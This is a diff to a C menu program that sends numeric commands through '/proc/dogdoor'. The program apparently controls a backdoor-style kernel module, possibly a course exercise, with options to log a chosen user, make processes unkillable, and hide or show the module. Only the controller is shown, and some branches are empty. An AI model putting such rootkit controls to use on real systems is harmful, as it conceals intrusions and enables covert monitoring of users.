@@ -15,9 +15,10 @@ int main (int argc, char *argv[]){
 	printf("choose the function(input number)\n");
 	printf("--1. input userid\n");
 	printf("--2. get user log\n");
-	printf("--3. make imortal/mortal process\n");
-	printf("--4. hide module\n");
-	printf("--5. show module\n");
+	printf("--3. make imortal process\n");
+	printf("--4. make mortal process\n");
+	printf("--5. hide module\n");
+	printf("--6. show module\n");
 	printf("----------------------\n");
 	
 	while(strcmp(input, "quit")!= 0){
@@ -26,12 +27,17 @@ int main (int argc, char *argv[]){
 
 		if(strcmp(input,"1") == 0){
 			int uid=0;
+			printf("input user id\n");
+			scanf("%d", &uid);
+			write2(1, uid);
 		}else if(strcmp(input,"2") == 0){
 		}else if(strcmp(input,"3") == 0){
 		}else if(strcmp(input,"4") == 0){
 			write1(4);
-		}else if(strcmp(input,"5")==0){
+		}else if(strcmp(input,"5") == 0){
 			write1(5);
+		}else if(strcmp(input,"6") == 0){
+			write1(6);
 		}else{
 			printf("no such function\n");
 		}
@@ -54,7 +60,8 @@ void write2(int index, int id)
 {
 	FILE *file_pointer;
 	file_pointer=fopen("/proc/dogdoor", "w");
-	fprintf(file_pointer, "bingo.c");
+	fprintf(file_pointer, "%d ", index);
+	fprintf(file_pointer, "%d", id);
 	fclose(file_pointer);
 	return;
 }
